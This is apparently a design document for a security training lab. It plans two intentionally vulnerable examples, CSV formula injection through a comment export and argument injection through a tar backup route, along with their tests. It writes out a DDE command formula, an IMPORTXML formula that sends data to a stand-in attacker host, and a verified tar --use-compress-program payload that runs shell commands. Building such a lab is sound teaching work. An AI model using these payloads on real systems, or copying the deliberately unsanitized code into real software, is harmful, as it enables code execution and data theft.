# CSV Injection & Argument Injection Additions — Design

## Overview

Adds 2 new intentionally-vulnerable examples to the OWASP Top 10 Training Lab, sourced from PayloadsAllTheThings' [CSV Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection) and [Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection) reference pages (the latter's "Argument Injection" subsection specifically):

1. **CSV Formula Injection** — new group "CSV Injection" in A03 Injection.
2. **Argument Injection via tar Archive Export** — new example in A03's existing "OS Command Injection" group.

No new categories, no new SQLAlchemy models (the CSV example reuses the existing `Comment` model). Examples 88 → 90. Max score 1830 → 1880 (one Medium +20, one Hard +30).

This is a fourth round in the same series as the three merged PayloadsAllTheThings-additions rounds (round 1: 63→78, A01/A02/A04/A05/A07; round 2: 78→86, A04/A05 Business Logic Errors + CORS Misconfiguration; round 3: 86→88, A09 Log Injection/Forging + A03 CSS Injection). It follows every convention those rounds established: category/subgroup placement with Easy→Hard per-group sorting, the six-block `example_page_base.html` template structure, `hints=[...]` with the two-block-type escaping convention, the scoring+hints system, and the standing rule that the vulnerabilities are the deliverable and must never be softened or sanitized.

## Source Material Triage

Four reference pages were analyzed this round; two were fully scoped out after triage (both decisions user-confirmed via AskUserQuestion):

- **Clickjacking**: skipped entirely. This app already has one clickjacking example (A05's `clickjacking-delete-account` — invisible-iframe overlay on a page with no X-Frame-Options). The reference page's other content is either the same technique or relies on browser behavior removed years ago (IE8's XSS filter, Chrome 4.0's XSSAuditor). The one still-relevant novel technique — bypassing a JS frame-buster via `onbeforeunload` — would require first adding a naive frame-busting defense to some other page specifically to demonstrate defeating it; judged disproportionate scope for this round.
- **Client-Side Path Traversal (CSPT)**: skipped entirely. This app is server-rendered Jinja throughout; no existing page performs a client-side `fetch()`/XHR call with a user-controlled path segment, which is the only thing CSPT can exploit. A genuine demo would require building new, purpose-built client-side JS infrastructure with no other use in the app — the same "architecture mismatch" judgment round 3 made for classic CRLF header injection.

The other two yielded exactly one genuinely new example each:

- **CSV Injection**: the entire reference page maps to one technique family (formula injection via unescaped spreadsheet-export cells) with no sub-variant requiring separate treatment — one example covers it, with hints escalating through the family's severity levels (detection → code execution via DDE → data exfiltration via Google Sheets `IMPORTXML`).
- **Command Injection**: A03 already has 3 examples (`filtered-host-lookup` Medium, `command-injection` Hard, `blind-report-injection` Hard) covering shell metacharacter filter-bypass, direct chaining, and blind time-based exfiltration. Nearly everything else on the reference page (IFS-based space bypass, brace expansion, quote-splitting, hex/variable-substring encoding tricks) is a variation of the filter-bypass idea already taught by `filtered-host-lookup`. DNS-based exfiltration needs a real external out-of-band listener to demonstrate live — infeasible for a self-contained lab route. The one genuinely distinct, still-current technique is **Argument Injection**: a different bug class entirely, where `shell=False` correctly blocks metacharacter injection but an unvalidated argv element still lets an attacker inject a flag rather than a plain argument.

## The 2 New Examples

### 1. CSV Formula Injection (A03, new group "CSV Injection", Medium)

**Title:** "CSV Formula Injection via Comment Export"

**Existing infrastructure this reuses:** the `Comment` SQLAlchemy model (`app/categories/a03_injection/models.py:21-26`, fields `author`/`body`) and the existing `/a03/comments` POST endpoint (`app/categories/a03_injection/routes.py:138-146`, already used by the `stored-xss` example) — no changes to either. Comments submitted there are visible to this new example's export route without any new submission plumbing.

**New route:** `/a03/export-comments-csv` (GET). Queries all `Comment` rows and writes them to a CSV response via Python's `csv` module, with **no formula-character neutralization**: no leading `'` prefix added to cells starting with `=`, `+`, `-`, or `@`, no stripping, no validation of any kind. Served with `Content-Disposition: attachment` so it downloads as a real file, matching how a real "export to spreadsheet" feature behaves.

**Vulnerability:** a spreadsheet application (Excel, LibreOffice, Google Sheets) that opens the downloaded CSV treats any cell whose content starts with one of those four characters as a formula to evaluate, not literal text — an attacker who can submit a comment (the `author` or `body` field) controls what formula runs when a victim (e.g. a support agent reviewing exported comments) opens the file.

**Exploitation, escalating via hints:**
1. Detect: submit a comment body of `=1+1`; after export, note the cell's raw content is the literal, un-neutralized formula text.
2. Code execution via DDE: submit `=cmd|'/C calc'!A0` (from the reference material) — explained textually as spawning Calculator when opened in a DDE-enabled version of Excel, since this can't be literally demonstrated inside a browser-driven test (matching this lab's existing precedent for out-of-app consequences, e.g. `sqli-to-rce`'s reverse-shell escalation step, described in prose and never executed by the automated test suite).
3. Data exfiltration via Google Sheets: submit `=IMPORTXML("http://attacker.example/track", "//a/@href")` — explained as a live network request an unsuspecting victim's Google Sheets session would make on their behalf the moment the cell is viewed, silently confirming the payload landed and potentially exfiltrating parsed spreadsheet data back to the attacker.

**Live demo:** a small comment-submission form (posting to the existing `a03_injection.comments` endpoint) plus a "Download CSV Export" link to the new route, both on the new example's own page — self-contained, no changes to the existing `comments.html` template.

**Testing approach:** real Flask test client. Post a comment whose body starts with `=`, fetch the export route, and assert the raw CSV response bytes contain the exact unmodified payload with no leading `'` or other neutralization character prepended, plus assert the response has `Content-Disposition: attachment` and a `text/csv` mimetype.

### 2. Argument Injection via tar Archive Export (A03, existing "OS Command Injection" group, Hard)

**Title:** "Argument Injection via Unsanitized tar Archive Export"

**New route:** `/a03/export-archive` (GET/POST). A "back up your files" feature. On POST, takes a `filename` form field and invokes:

```python
subprocess.run(
    ["tar", "-cf", archive_path, filename],
    shell=False,
    cwd=ARCHIVE_EXPORT_DIR,
    capture_output=True,
    text=True,
    timeout=10,
)
```

**Vulnerability:** `shell=False` with the list-argument form genuinely blocks every shell-metacharacter injection technique this app's other command-injection examples rely on (no `;`, `|`, backticks, or newlines reach a shell) — but `filename` is still passed through as a single, completely unvalidated argv element. GNU tar's own argument parser treats any value starting with `--` as a long option, not a filename, regardless of how it arrived in `argv`.

**Verified exploit (empirically tested against this app's actual Docker base image, `python:3.12-slim`, which ships GNU tar 1.35 by default):** submitting

```
--use-compress-program=sh -c "id > /tmp/a03_argument_injection_proof.txt"
```

as the `filename` value makes tar invoke that entire string as its "compressor" program when creating the archive — achieving genuine, verified command execution. Confirmed directly: `docker run --rm python:3.12-slim bash -c '...'` produced a real proof file containing `uid=0(root) gid=0(root) groups=0(root)`, proving the primitive works exactly as described, not merely in theory. `--use-compress-program` is a well-documented real-world argument-injection vector (part of the GTFOBins/SonarSource-cataloged techniques the reference material itself points to) and is safe to demonstrate here since it only runs `id`, matching this app's own established pattern in `sqli-to-rce` of proving code execution without opening a real reverse shell.

**Route behavior:** after each `tar` invocation, the route checks whether `/tmp/a03_argument_injection_proof.txt` now exists and, if so, reads and displays its contents inline — the same "safe proof of execution" pattern `sqli-to-rce` already uses (there, a DB table; here, a fixed, hint-disclosed proof-file path, since this is OS-level execution rather than DB-level).

**Testing approach:** real Flask test client. POST the exact payload above as `filename`, then assert the response (or a follow-up GET) shows proof-file content matching `uid=` — proving the injected command genuinely executed, not just that the route accepted the input without erroring.

**Group placement rationale:** this is conceptually adjacent to A03's existing "OS Command Injection" group (all about executing/manipulating system commands) but is a materially different bug class from that group's other 3 members — the teaching point ("avoiding `shell=True` is not sufficient on its own") only lands if taught alongside the group's existing shell-injection examples, matching how the reference material itself presents Argument Injection as a subsection of the same Command Injection page rather than a standalone category. New entry, not a new group; inserted after `blind-report-injection` (the group's existing 3 members are already Medium/Hard/Hard-sorted; appending a 4th Hard entry preserves Easy→Hard order trivially).

## Category Placement Summary

| Example | Category | New/Existing Group | Difficulty | Points |
|---|---|---|---|---|
| CSV Formula Injection via Comment Export | A03 Injection | New: "CSV Injection" | Medium | +20 |
| Argument Injection via Unsanitized tar Archive Export | A03 Injection | Existing: "OS Command Injection" | Hard | +30 |

Final A03 shape: 20 → 22 examples, 7 → 8 groups.
App total: 88 → 90 examples. Max score: 1830 → 1880.

## Data Model Approach

No new SQLAlchemy models. The CSV example reuses the existing `Comment` model unmodified. The argument-injection example uses only a plain module-level constant for the proof-file path (`ARGUMENT_INJECTION_PROOF_PATH = "/tmp/a03_argument_injection_proof.txt"`) and a workspace directory constant for the archive itself — matching A04/A09's established precedent of plain constants over new models for simple demo state.

## Testing Approach

Per-example test files following this app's one-file-per-example convention (`tests/test_a03_csv_injection.py`, `tests/test_a03_argument_injection.py`), using the real Flask test client against the actual vulnerable routes — no mocking, and specifically no mocking of `subprocess.run` for the argument-injection test, since the whole point is proving the real `tar` binary genuinely executes the injected command. Cross-cutting files to update: `tests/test_a03_hints_remaining_groups.py` (A03's hints tests are already split into `test_a03_hints_sqli_group.py` for the SQL Injection group and this file's `REMAINING_GROUP_IDS` list for every other group — both new examples' ids belong in the latter, matching round 3's precedent for `css-attribute-exfil`), `tests/test_a03_overview.py`, `tests/test_all_examples_have_hints.py` (total 88→90), `tests/test_hints.py` (max score 1830→1880), and `README.md`'s category summary table and intro paragraph.

## Scope Note

This is a small round by design: two of the four reference pages were fully scoped out after triage found their content already covered or architecturally disproportionate for this app (both decisions user-confirmed), leaving exactly 2 genuinely new examples from the other two. This matches round 3's precedent of a small, focused round rather than padding scope with tangential or already-covered material.
